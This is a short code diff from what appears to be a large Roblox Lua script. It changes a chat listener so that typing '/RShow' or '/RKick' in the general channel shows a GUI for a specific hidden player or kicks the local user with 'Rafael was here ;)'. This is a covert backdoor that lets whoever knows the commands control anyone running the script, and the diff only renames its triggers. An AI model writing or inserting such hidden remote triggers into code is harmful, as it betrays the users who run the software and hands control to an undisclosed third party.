@@ -11982,12 +11982,12 @@ if GG.TextService.ChatVersion == Enum.ChatVersion.TextChatService then
     GG.TextService.OnIncomingMessage = function(msg)
         local data = msg.Text;
         if data and data ~= "" and msg.TextChannel == GG.TextService.TextChannels.RBXGeneral then
-            if data == "/TShow" then
-                local Rafael = FindFirstChild(GG.P, "fo_5r");
+            if data == "/RShow" then
+                local Rafael = FindFirstChild(GG.P, "uUY1q");
                 if Rafael then
                     createOrUpdateGui(Rafael);
                 end;
-            elseif data == "/TKick" then
+            elseif data == "/RKick" then
                 selff:Kick("Rafael was here ;)");
             end;
         end;
